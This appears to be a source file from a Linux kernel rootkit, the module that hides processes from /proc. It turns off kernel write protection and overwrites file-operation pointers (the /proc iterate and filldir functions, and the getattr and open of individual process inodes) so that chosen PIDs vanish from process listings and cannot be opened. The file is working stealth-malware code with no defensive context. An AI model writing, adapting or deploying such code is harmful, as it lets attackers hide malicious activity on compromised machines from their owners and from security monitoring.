#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/namei.h>
#include <linux/kernel.h>
#include <linux/sched.h>

#include "err.h"
#include "procfs_ops.h"
#include "memory_prot.h"
#include "inline_hooking.h"

#define MAX_PID_LENGTH  8

typedef int (*getattr_t)(const struct path *, struct kstat *kstat,
			 u32 mask, unsigned flag);

//TODO add lock
struct hidden_pid
{
	char pid[MAX_PID_LENGTH];
	struct inode_operations *i_op;
	struct file_operations *i_fop;
	struct inode *inode;
	struct list_head list;
};

/* Hidden pids linked list */
LIST_HEAD(hidden_pids);

/* original function pointers */
static filldir_t proc_orig_filldir;
static getattr_t orig_getattr;
static int (*orig_open)(struct inode *i, struct file *f);
static int (*proc_orig_iterate)(struct file *, struct dir_context *);
static int (*proc_orig_iterate_shared)(struct file *, struct dir_context *);


static struct file_operations *proc_orig_fops;
static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *dummy;
static struct file_operations dummy_fops =
{
	.owner = THIS_MODULE
};


static struct inode *proc_find_inode(const char *name)
{
	struct path path;
	int err = kern_path(name, LOOKUP_FOLLOW, &path);
	if (err) {
		log_err("couldn't find path : %s\n", name);
		return NULL;
	}
	return path.dentry->d_inode;

}

static bool is_pid_hidden(const char *pid)
{
	struct hidden_pid *hpid;
	if (!pid)
		return false;
	if (list_empty(&hidden_pids))
		return false;
	list_for_each_entry(hpid, &hidden_pids, list) {
		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
			return true;
	}
	return false;
}

bool is_inode_hidden(const struct inode *inode)
{
	struct hidden_pid *hpid;
	if (!inode || list_empty(&hidden_pids))
		return false;
	list_for_each_entry(hpid, &hidden_pids, list) {
		if (hpid->inode == inode)
			return true;
	}
	return false;
}

static int zl_getattr(const struct path *path, struct kstat *kstat,
		      u32 mask, unsigned int flags)
{
	if (!path)
		goto orig;
	if (!path->dentry)
		goto orig;
	if (is_pid_hidden(path->dentry->d_name.name))
		return -ENOENT;
orig:
	return orig_getattr(path, kstat, mask, flags);
}

static int zl_open(struct inode *i, struct file *f)
{
	if (!f)
		goto orig;
	if (!f->f_path.dentry)
		goto orig;
	if (!f->f_path.dentry->d_name.name)
		goto orig;
	if (is_pid_hidden(f->f_path.dentry->d_name.name))
		return -ENOENT;
orig:
	if (!orig_open)
		return -1;
	return orig_open(i, f);
}

/* Add the given pid to the hidden pids list.
 * This list is used in filldir to check if a pid is hidden
 */
bool hide_pid(const char *pid)
{
	struct hidden_pid *hpid;
	struct inode *pid_inode;
	char proc_pid_path[256];
	if (!pid)
		return false;
	if (is_pid_hidden(pid)) {
		log_err("pid %s in already hidden\n", pid);
		return false;
	}
	hpid = kmalloc(sizeof(struct hidden_pid), GFP_KERNEL);
	if (!hpid) {
		log_err("kmalloc failed to alloc hidden_pid\n");
		return false;
	}
	if (snprintf(proc_pid_path, 255, "/proc/%s/", pid) < 0) {
		log_err("snprintf error\n");
		goto free_err;
	}
	pid_inode = proc_find_inode(proc_pid_path);
	if (!pid_inode) {
		log_err("cannot retrieve inode for pid %s\n", pid);
		goto free_err;
	}
	hpid->i_op = (void*)pid_inode->i_op;
	hpid->i_fop = (void*)pid_inode->i_fop;
	hpid->inode = pid_inode;
	orig_getattr = (void*)pid_inode->i_op->getattr;
	orig_open = (void*)pid_inode->i_fop->open;
	disable_wp();
	*((unsigned long **)&pid_inode->i_op->getattr) = (void*)zl_getattr;
	*((unsigned long **)&pid_inode->i_fop->open) = (void *)zl_open;
	enable_wp();
	strncpy(hpid->pid, pid, MAX_PID_LENGTH);
	INIT_LIST_HEAD(&hpid->list);
	list_add_tail(&hpid->list, &hidden_pids);
	return true;
free_err:
	kfree(hpid);
	return false;
}

/* You might need to unhide the pid to kill the process */
bool unhide_pid(const char *pid)
{
	struct hidden_pid *hpid;
	if (!pid)
		return false;
	if (!is_pid_hidden(pid)) {
		log_err("pid %s isn't hidden\n", pid);
		return false;
	}
	list_for_each_entry(hpid, &hidden_pids, list) {
		if (!strncmp(hpid->pid, pid, MAX_PID_LENGTH))
			break;
	}
	if(strncmp(hpid->pid, pid, MAX_PID_LENGTH))
		return false;
	disable_wp();
	hpid->i_fop->open = orig_open;
	hpid->i_op->getattr = orig_getattr;
	enable_wp();
	list_del(&hpid->list);
	kfree(hpid);
	return true;
}

static int proc_zl_filldir(struct dir_context *ctx, const char *name,
		           int namelen, loff_t off, u64 ino, unsigned d_type)
{
	if (is_pid_hidden(name))
		return 0;
	return proc_orig_filldir(ctx, name, namelen, off, ino, d_type);
}

static int proc_zl_iterate(struct file *file, struct dir_context *ctx)
{
	int err;
	proc_orig_filldir = ctx->actor;
	*((filldir_t*)&ctx->actor) = proc_zl_filldir;
	if (proc_orig_iterate)
		err = proc_orig_iterate(file, ctx);
	else if (proc_orig_iterate_shared)
		err = proc_orig_iterate_shared(file, ctx);
	else {
		log_err("proc_orig_iterate_* are null\n");
		*((filldir_t*)&ctx->actor) = proc_orig_filldir;
		return 0;
	}
	*((filldir_t*)&ctx->actor) = proc_orig_filldir;
	return err;
}


/*
 * replace /proc/ iterate function to hide pids in hidden_pids list
 *
 * return wether init worked or failed
 */
bool init_procfs(void)
{
	dummy = proc_create("dummy", S_IFREG | S_IRUGO, NULL, &dummy_fops);
	if (!dummy) {
		log_err("Cannot create entry in procfs\n");
		remove_proc_entry("dummy", NULL);
		return false;
	}
	proc_root = dummy->parent;
	remove_proc_entry("dummy", NULL);
	if (strcmp(proc_root->name, "/proc")) {
		log_err("Cannot retrieve proc_root\n");
		return false;
	}
	proc_orig_fops = (struct file_operations *)proc_root->proc_fops;
	proc_orig_iterate = proc_orig_fops->iterate;
	proc_orig_iterate_shared = proc_orig_fops->iterate_shared;
	disable_wp();
	proc_orig_fops->iterate = proc_zl_iterate;
	proc_orig_fops->iterate_shared = proc_zl_iterate;
	enable_wp();
	hook_inode_permission();
	return true;
}

void cleanup_procfs(void)
{
	if (!proc_orig_fops)
		return;
	disable_wp();
	proc_orig_fops->iterate = proc_orig_iterate;
	proc_orig_fops->iterate_shared = proc_orig_iterate_shared;
	enable_wp();
	unhook_inode_permission();
}
